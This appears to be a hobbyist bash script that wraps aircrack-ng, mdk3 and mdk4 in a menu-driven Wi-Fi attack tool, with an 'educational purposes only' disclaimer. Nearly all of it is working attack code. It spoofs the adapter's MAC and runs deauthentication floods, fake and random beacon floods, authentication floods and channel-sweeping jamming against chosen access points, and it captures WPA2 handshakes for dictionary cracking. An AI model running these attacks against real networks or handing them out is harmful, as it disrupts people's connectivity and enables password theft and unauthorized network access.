#!/bin/bash

#this script is for educational purposes only
#I am not responsible for any damage caused by its use
#this script is for testing your own network or someone else's network *WITH PERMISSION*

#this script is for auditing WPA2 APs
#by: TDonk994

#start date: 10/02/2024
#last commit date: 11/24/2024




echo "DOS Attack for WPA2 APS, using airodump, airmon, mdk3 and mdk4"
sleep 1
echo "make sure you have sudo privileges"
echo "make sure you have a wireless adapter able to go into monitor mode"
echo "recommend to use in dir desktop"
read -p "Do you want to continue? (y/n): " continue
if [ $continue == "n" ]; then
    echo "exiting"
    exit 1
else
    echo "continuing"
fi
sleep 1
echo "Checking if mdk3, mdk4 and aircrack-ng are installed"
#this variables check if the packages are installed
mdk3Check=$(sudo dpkg -s mdk3 &> /dev/null && echo "true" || echo "false")
mdk4Check=$(sudo dpkg -s mdk4 &> /dev/null && echo "true" || echo "false")
aircrackCheck=$(sudo dpkg -s aircrack-ng &> /dev/null && echo "true" || echo "false")
#this checks if mdk3 is installed
if [ $mdk3Check == "false" ]; then
    echo "mdk3 is not installed"
    read -p "Do you want to install mdk3? (y/n): " install
    if [ $install == "y" ]; then
        echo "installing mdk3"
        sudo apt-get install mdk3
        echo "mdk3 installed"
    else
        echo "mdk3 is required for this attack"
        exit 1
    fi
else
    echo "mdk3 is installed"
fi
#this checks if mdk4 is installed
if [ $mdk4Check == "false" ]; then
    echo "mdk4 is not installed"
    read -p "Do you want to install mdk4? (y/n): " install
    if [ $install == "y" ]
    then
        echo "installing mdk4"
        sudo apt-get install mdk4
        echo "mdk4 installed"
    else
        echo "mdk4 is required for this attack"
        exit 1
    fi
else
    echo "mdk4 is installed"
fi
#this checks if aircrack-ng is installed
if [ $aircrackCheck == "false" ]; then
    echo "aircrack-ng is not installed"
    read -p "Do you want to install aircrack-ng? (y/n): " install
    if [ $install == "y" ]; then
        echo "installing aircrack-ng"
        sudo apt-get install aircrack-ng
        echo "aircrack-ng installed"
    else
        echo "aircrack-ng is required for this attack"
        exit 1
    fi
else
    echo "aircrack-ng is installed"
fi
sleep 1
#setting up the wireless adapter and other stuff that might interfere with the attack
echo "setting up the wireless adapter/interfaces"
sudo ifconfig eth0 down 
sudo ifconfig wlan0 down 
sudo macchanger wlan0 
sudo airmon-ng check kill
sudo airmon-ng start wlan0
sudo ifconfig wlan0 up
Clears_CSV() { #edit the core function of clearing csv files here
    if [ -e "wlan0-01.csv" ]; then
        sudo rm wlan0-01.csv
        echo "removed wlan0-01.csv"
    else
        echo "no more wlan0-01.csv"
    fi
    if [ -e "bssid.csv" ]; then
        sudo rm bssid.csv
        echo "removed bssid.csv"
    else
        echo "no more bssid.csv"
    fi
    if [ -e "bssid1.csv" ]; then
        sudo rm bssid1.csv
        echo "removed bssid1.csv"
    else
        echo "no more bssid1.csv"
    fi
    if [ -e "bssid2.csv" ]; then
        sudo rm bssid2.csv
        echo "removed bssid2.csv"
    else
        echo "no  more bssid2.csv"
    fi
    if [ -e "bssid3.csv" ]; then
        sudo rm bssid3.csv
        echo "removed bssid3.csv"
    else
        echo "no more bssid3.csv"
    fi
    echo "all files deleted or non existent"
    sleep 1
}

For_aireplay () { #works
    echo "setting up aireplay-ng deauth attack"
    #also recommend to use the desktop directory for this for testing
    sleep 1
    Just_Analysis
    while true; do
        read -p "Mac(1), Name(2), exit(3), Return(4): " choice
        if [ $choice == 1 ]; then
            read -p "Enter the AP's MAC address: " MAC
            echo "you chose $MAC"
            MacCheck=$(cat bssid.csv | grep $MAC &> /dev/null && echo "true" || echo "false")
            if [ $MacCheck == "false" ]; then
                echo "AP not found, exiting"
                exit 1
            else
                echo "AP found"
            fi
            cat bssid.csv | grep $MAC > bssid2.csv
            usedbssid=$(cat bssid2.csv | awk '{print $1}')
            channelused=$(cat bssid2.csv | awk '{print $2}')
            Just_Deauth_lyer2 $channelused $usedbssid
            continue
        elif [ $choice == 2 ]; then #Works
            cat bssid.csv | awk '{print $3, $4}' | sort
            read -p "which AP(use the name)?: " AP
            echo "you chose $AP"
            cat bssid.csv | grep "$AP" > bssid2.csv
            numberofbssid=$(cat bssid2.csv | wc -l)
            if [ $numberofbssid == 1 ]; then #Works
                usedbssid=$(cat bssid2.csv | awk '{print $1}')
                channelused=$(cat bssid2.csv | awk '{print $2}')
                Just_Deauth_lyer2 $channelused $usedbssid
                continue
            else #Works
                echo "more than one AP with that name, please use the MAC address"
                cat bssid2.csv | awk '{print}'
                read -p "Enter the AP's MAC address: " MAC
                echo "you chose $MAC"
                cat bssid2.csv | grep $MAC > bssid3.csv
                usedbssid=$(cat bssid3.csv | awk '{print $1}')
                channelused=$(cat bssid3.csv | awk '{print $2}')
                Just_Deauth_lyer2 $channelused $usedbssid
                continue
            fi
        elif [ $choice == 3 ]; then #Works
            echo "exiting"
            exit 1
        elif [ $choice == 4 ]; then #Works
            echo "returning"
            break
        else #Works
            echo "invalid input:("
            continue
        fi
    done
}

Just_Analysis () { #edit the core function of analysis here 
    echo "scanning for APs"
    echo "removing existing csv files if they exist"
    Clears_CSV
    sleep 1
    echo "starting airodump-ng to find APs, this will take 30 seconds"
    sudo timeout 30 airodump-ng -b abg wlan0 --write wlan0 --output-format csv
    sleep 2
    Just_Filter
}

For_mdk3 () { #works
    echo "you chose to use randon SSID beacon flood"
    while true; do
        read -p "which channel do you want to flood?: " channel
        if [[ -n ${channel//[0-9]/} ]]; then
            echo "invalid input"
            continue
        else
            echo "you chose channel $channel"
            echo "starting mdk3 channel becon flood"
            echo "cancel the attack early with ctrl c"
            echo "running for 3 minutes"
            sudo mdk3 wlan0 b -c $channel
            sleep 2
            break
        fi
        
    done
}

For_mdk4 () { #works
    echo "you chose to choose a fake SSID beacon flood"
    read -p "which SSID/name do you want to use?: " SSID
    echo "your fake AP is $SSID"
    while true; do
        read -p "which channel do you want to use?: " channel
        if [[ -n ${channel//[0-9]/} ]]; then
            echo "invalid input"
            continue
        else 
            echo "chosen channel is $channel"
            echo "starting mdk4 fake SSID beacon flood"
            echo "cancel the attack early with ctrl c"
            echo "running for 3 minutes"
            sudo timeout 180 mdk4 wlan0 b -n $SSID -c "$channel"
            sleep 2
            break
        fi
    done
}

For_Analysis () { #works
    read -p "do you want to continue with nearby AP analysis? (y/n): " For
    if [ $For == "n" ]; then
        echo "returning"
        break
    else
        echo "continuing"
    fi
    echo "you chose nearby AP analysis"
    sleep 1
    Just_Analysis
    cat bssid.csv | awk '{print}'
    sleep 1
    while true; do
        echo -e "what next?\n1) Layer 2 Deauth\n2) Random SSID beacon flood\n3) Chosen fake SSID beacon flood\n4) Auth Flood\n5) metrics\n6) Exit\n7) Return"
        read -p "what's your choice: " attack2
        if [ $attack2 == 1 ]; then
            echo "you chose Layer 2 Deauth"
            read -p "MAC(1) or Name(2)?: " choice
            if [ $choice == 1 ]; then
                cat bssid.csv | awk '{print $1 , $3}' | sort
                read -p "Enter the AP's MAC address: " MAC
                echo "you chose $MAC"
                cat bssid.csv | grep $MAC > bssid2.csv
                usedbssid=$(cat bssid2.csv | awk '{print $1}')
                channelused=$(cat bssid2.csv | awk '{print $2}')
                Just_Deauth $channelused $usedbssid
                continue
            elif [ $choice == 2 ]; then
                cat bssid.csv | awk '{print $3}'
                read -p "which AP(use the name)?: " AP
                echo "you chose $AP"
                cat bssid.csv | grep "$AP" > bssid2.csv
                numberofbssid=$(cat bssid2.csv | wc -l)
                if [ $numberofbssid == 1 ]; then
                    usedbssid=$(cat bssid2.csv | awk '{print $1}')
                    channelused=$(cat bssid2.csv | awk '{print $2}')
                    Just_Deauth $channelused $usedbssid
                    continue
                else
                    echo "more than one AP with that name, please use the MAC address"
                    cat bssid2.csv | awk '{print}'
                    read -p "Enter the AP's MAC address: " MAC
                    echo "you chose $MAC"
                    cat bssid2.csv | grep $MAC > bssid3.csv
                    usedbssid=$(cat bssid3.csv | awk '{print $1}')
                    channelused=$(cat bssid3.csv | awk '{print $2}')
                    Just_Deauth $channelused $usedbssid
                    continue
                fi
            else
                echo "invalid input:("
                continue
            fi
        elif [ $attack2 == 2 ]; then
            For_mdk3
            continue
        elif [ $attack2 == 3 ]; then
            For_mdk4
            continue
        elif [ $attack2 == 4 ]; then
            For_Auth_Flood
            continue
        elif [ $attack2 == 5 ]; then
            echo "you chose metrics"
            echo "metrics are not available at this time"
            sleep 1
            echo "returning"
            break
        elif [ $attack2 == 6 ]; then
            echo "exiting"
            exit 1
        elif [ $attack2 == 7 ]; then
            echo "returning"
            break
        else
            echo "invalid input, try again"
            continue
        fi
    done
}

For_Auth_Flood () { #worksk
    echo "you chose Auth Flood"
    sleep 1
    echo "this auth flood will use mkd4"
    sleep 1
    echo "would you like to scan for APs or do you already know its MAC address?"
    while true; do
        echo -e "1) Scan for APs\n2) Already know MAC address\n3) Exi\n4) Return"
        read -p "what's your choice: " choice
        if [ $choice == 1 ]; then
            Just_Analysis
            cat bssid.csv | awk '{print $3}' | sort
            read -p "which AP?: " AP
            echo "you chose $AP"
            # now confirm the AP exists
            cat bssid1.csv | grep "$AP" > bssid2.csv
            numberofbssid=$(cat bssid2.csv | wc -l)
            if [ $numberofbssid == 1 ]; then
                usedbssid=$(cat bssid2.csv | awk '{print $1}')
                channelused=$(cat bssid2.csv | awk '{print $2}')
                echo "you chose $usedbssid"
                echo "you chose channel $channelused"
                echo "starting mdk4 auth flood"
                echo "running for 3 minutes"
                echo "cancel the attack with ctrl c"
                sudo timeout 180 mdk4 wlan0 a -a $usedbssid
                sleep 2
                continue
            else
                echo "more than one or no APs with that name, please use the MAC address"
                cat bssid2.csv | awk '{print}'
                read -p "Enter the AP's MAC address: " MAC
                echo "you chose $MAC"
                cat bssid2.csv | grep $MAC > bssid3.csv
                usedbssid=$(cat bssid3.csv | awk '{print $1}')
                channelused=$(cat bssid3.csv | awk '{print $2}')
                echo "you chose $usedbssid"
                echo "you chose channel $channelused"
                echo "starting mdk4 auth flood"
                echo "running for 3 minutes"
                echo "cancel the attack with ctrl c"
                sudo timeout 180 mdk4 wlan0 a -a $usedbssid
                sleep 2
                continue
            fi
        elif [ $choice == 2 ]; then
            read -p "Enter the AP's MAC address: " MAC3
            echo "you chose $MAC3"
            read -p "Enter the AP's channel: " CHANN
            echo "you chose channel $CHANN"
            sudo iwconfig wlan0 channel $CHANN
            echo "starting mdk4 auth flood"
            echo "running for 3 minutes"
            echo "cancel the attack early with ctrl c"
            sudo timeout 180 mdk4 wlan0 a -a $MAC3
            sleep 2
            continue
        elif [ $choice == 3 ]; then
            echo "exiting"
            exit 1
        elif [ $choice == 4 ]; then
            echo "returning"
            break
        else
            echo "invalid input"
            continue
        fi
    done
}

For_WPA2_Crack () {
    echo "you chose WPA2 Crack"
    sleep 1
    Just_Analysis
    cat bssid.csv | awk '{print $3}' | sort
    read -p "which AP (use the name)?: " AP
    echo "you chose $AP"
    cat bssid.csv | grep "$AP" > bssid2.csv
    usedbssid=$(cat bssid2.csv | awk '{print $1}')
    channelused=$(cat bssid2.csv | awk '{print $2}')
    while true; do
        read -p "would you like to wait for a handshake or deauth the clients? 1)handshake, 2)deauth, 3)Exit 4) main-menu : " choice
        if [ $choice == 1 ]; then
            EAPOL_Capture $channelused $usedbssid
            continue
        elif [ $choice == 2 ]; then
            #EAPOL_Capture_Deauth $channelused $usedbssid
            echo "not available at this time"
            continue
        elif [ $choice == 3 ]; then
            echo "exiting"
            exit 1
        elif [ $choice == 4 ]; then
            echo "returning"
            break
        else
            echo "invalid input11"
            continue
        fi
    done
}

EAPOL_Capture () {
    CHANNEL=$1
    BSSID=$2
    echo "capturing EAPOL handshake"
    if [ -e "thehandshake.pcap" ]; then
        sudo rm thehandshake.pcap
        echo "removed thehandshake.pcap"
    else
        echo "no more thehandshake.pcap"
    fi
    sudo airodump-ng -c $CHANNEL -d $BSSID -w thehandshake.pcap wlan0
    echo "handshake captured"
    echo "cracking the handshake"
    sudo aircrack-ng -w passwdfile.dic -b $BSSID thehandshake.pcap
}

EAPOL_Capture_Deauth () {
    CHANNEL=$1
    BSSID=$2
    echo "capturing EAPOL handshake and deauthenticating clients"

}

For_Layer1_Deauth () {
    echo "you chose Layer 1 Deauth"
    while true; do
        read -p "frequencey band(1), channel(2), Return(3) or exit(anything else) you wish to use: " OP
        if [ $OP == 1 ]; then
            read -p "Enter frequencey band you wish to use (2.4 or 5): " band
            if [ $band == 2.4 ]; then
                band_op="2.4G"
            elif [ $band == 5 ]; then
                band_op="5G"
            else
                echo "exitting"
                exit 1
            fi
        elif [ $OP == 2 ]; then
            read -p "Enter channel you wish to use: " channel
            if [[ -n ${channel//[0-9]/} ]]; then
                echo "invalid input, returning"
                break
            else
                sudo iwconfig wlan0 channel $channel
            fi
        elif [ $OP == 3 ]; then
            echo "returning"
            break
        else
            echo "invalid input"
            continue
        fi
        read -p "would you like to continue? (y/n): " continue
        if [ $continue == "n" ]; then
            echo "returning"
            break
        else
            echo "continuing"
        fi
        echo "starting attack"
        echo "cancel the attack early with ctrl c"
        if [ $OP == 1 ]; then   
            
            if [ $band_op == "5G" ]; then
                echo "starting mdk4 Layer 1 Deauth on 5G"
                echo "cancel the attack early with ctrl c"
                for i in {36..165}; do
                    sudo mdk4 wlan0 b -c $i -h 5
                done

            elif [ $band_op == "2.4G" ]; then
                echo "starting mdk4 Layer 1 Deauth on 2.4G"
                echo "cancel the attack early with ctrl c"
                for i in $(seq 1 11); do
                    sudo mdk4 wlan0 b -c $i -h 2.4
                done
            else
                echo "error, returning"
                break
            fi
        elif [ $OP == 2 ]; then
            echo "starting mdk4 Layer 1 Deauth on channel $channel"
            echo "cancel the attack early with ctrl c"
            sudo mdk4 wlan0 b -c $channel
        else 
            echo "error, returning"
            break
        fi
    done
}

Just_Deauth_lyer2 () { #edit the core function Layer 2 deauth here
    CHANNEL=$1
    BSSID=$2
    echo "starting aireplay-ng deauth attack"
    echo "cancel the attack EARLY with ctrl c"
    sudo iwconfig wlan0 channel $CHANNEL
    echo "running for 3 minutes"
    sudo timeout 180 aireplay-ng -0 0 -a $BSSID wlan0
    sleep 2
}

Just_Filter () { #edit the core function of filtering the CSVs here
    echo "filtering the APs"
    cat wlan0-01.csv | grep -v "BSSID" | awk -F ',' '{print $1, $4, $14}' | sed 's/,//g' > bssid.csv
    #cat bssid1.csv | awk '{print $1, $6, $19}' > bssid.csv

}

while true; do #Main menu
    echo -e "Which do you want to use?\n1) Layer 2 Deauth\n2) Random SSID beacon flood\n3) Chosen fake SSID beacon flood\n4) Nearby AP analysis\n5) Auth Flood\n6) Layer 1 Deauth\n7) WPA2 Crack\n8) Exit"
    sleep 1
    read -p "what's your choice: " attack 
    if [ $attack == 1 ]; then
        For_aireplay #works
        continue
    elif [ $attack == 2 ]; then
        For_mdk3
        continue
    elif [ $attack == 3 ]; then
        For_mdk4
        continue
    elif [ $attack == 4 ]; then
        For_Analysis
        continue
    elif [ $attack == 5 ]; then
        For_Auth_Flood
        continue
    elif [ $attack == 6 ]; then
        For_Layer1_Deauth
        continue
    elif [ $attack == 7 ]; then
        For_WPA2_Crack
        continue
    elif [ $attack == 8 ]; then
        echo "exiting"
        exit 1
    else
        echo "invalid input, try again"
        continue
    fi
done





#asking the user which attack they want to use
